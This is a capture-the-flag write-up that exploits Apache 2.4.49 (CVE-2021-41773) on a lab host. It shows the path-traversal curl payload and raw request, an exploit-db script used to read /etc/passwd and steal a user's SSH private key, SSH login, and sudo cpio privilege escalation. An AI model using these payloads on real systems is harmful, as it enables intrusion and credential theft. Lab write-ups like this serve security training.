## Recon
```
└─# nmap -sS -vvv -A --min-rate 5000 10.0.160.144
PORT   STATE SERVICE    REASON         VERSION
22/tcp open  tcpwrapped syn-ack ttl 63
| ssh-hostkey: 
|   3072 e14a0761fd640f0e685dbfefb4598a3d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmuXmx2rM2pS593jUqtvIaB9sI7Lj67tpOPpSUAvt3uwuO15At4qiHZnizMTAl9MZasYi1uzv5pRyUxzuYatelOq+PzwMN2h8acp+3p9633NcW6Qcze6wOJ+PVDeFdqurU4/BvIjoendS48TXlZd+Kjm6JXHrKAvxZ256WNa8x+GzOMuH8OjN9Fl8JuKDfg318AG/w4j4nSY7EKPwGMcsHAv6pIhfVB0MSzwad/jblWgwk47BEc227YKS7SUjaVKFDbTTxZDHaplHdl+zhkHXgpbnEczmd0t8eZk1qCEQYWbBJinUSyNvP+660idLJV9lTj/pCrxC0GrXq3AurUPrpQ2TBfROWxPJudKC/+BKYyGHgBgCemKxwDUXHmygITCiymlU2dZgqoX+FMOVESd5My4PgZwgAT1fj+sQRY7F+HLfkP/Iet4Sl7lracpn+d6uSjV7ifqJk2DmamnLcIE/QRsrBSTtgQduaAluOeoGartIcN10zPjX/lLFR5PN75WM=
|   256 76777963efd0e1ffea7e3dd002c64999 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFmT6sVeBKHFfwyWVvSiNIEcAn6b68QJ6Nrg+5jz0pUQ
80/tcp open  tcpwrapped syn-ack ttl 63
|_http-title: sbs
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
OS fingerprint not ideal because: maxTimingRatio (4.020000e+01) is greater than 1.4
Aggressive OS guesses: HP ProCurve MSM422 WAP (93%), Linux 2.6.32 (91%), D-Link DIR-835 WAP (91%), Linux 2.4.21 - 2.4.25 (embedded) (9

```
I will fuzz on the port 80.
## Fuzz Dir
I haven't get nothing, but i noticed using `wapalyzer` that the target use apache 2.4.49, i will google it.
```
└─# searchsploit apache 2.4.49
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                           | multiple/webapps/50383.sh

```
I check github for a python3 script. and found `https://github.com/lorddemon/CVE-2021-41773-PoC`
```
─# python3 CVE-2021-41773.py 10.0.160.144
Server 10.0.160.144 IS VULNERABLE
The output is:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
ETSCTF:x:1000:33:ETSCTF User:/home/ETSCTF:/bin/bash
```
i found this user: `/home/ETSCTF:/bin/bash`, i will try to find her `id_rsa` in `.ssh` directory, Not work.
I found this `https://github.com/thehackersbrain/CVE-2021-41773.git`, i will try to get RCE.
```
curl --silent --path-as-is --insecure -k "$1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "/bin/bash" &>/dev/null && echo "[CVE-2021-41773][Vulnerable][$1]"
```
This ressources good to find it in shodan: https://armx64.medium.com/finding-and-exploiting-path-traversal-in-apache-2-4-49-http-server-cve-2021-41773-2ebb02d55ce2
and this one for manual: https://systemweakness.com/oh-my-webserver-ctf-7cf050e20a99
```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.0.160.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
ETSCTF:x:1000:33:ETSCTF User:/home/ETSCTF:/bin/bash
```
Manualy not work for me, i use the exploitdb to do an RCE: https://www.exploit-db.com/exploits/50383
```
bash 50383.sh target.txt /home/ETSCTF/.ssh/id_rsa
10.0.160.144
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAyYp/Y2Xp7Ikr5evA7wPIEPPQfu3JH1vzd5RbaPwnyrvjjCeGUfQM
```
```
chmod 600 id_rsa
└─# ssh ETSCTF@10.0.160.144 -i id_rsa
Linux apache.bctf.africa 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ETSCTF@apache:~$

```
## Privilege Escalation
Sudo privilege Escalation
```
ETSCTF@apache:~$ sudo -l
Matching Defaults entries for ETSCTF on apache:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ETSCTF may run the following commands on apache:
    (ALL : ALL) NOPASSWD: /bin/cpio
    ```
find : https://gtfobins.github.io/gtfobins/cpio/
`ETSCTF_8dbe05597c9765be8b08657ca7acf09f`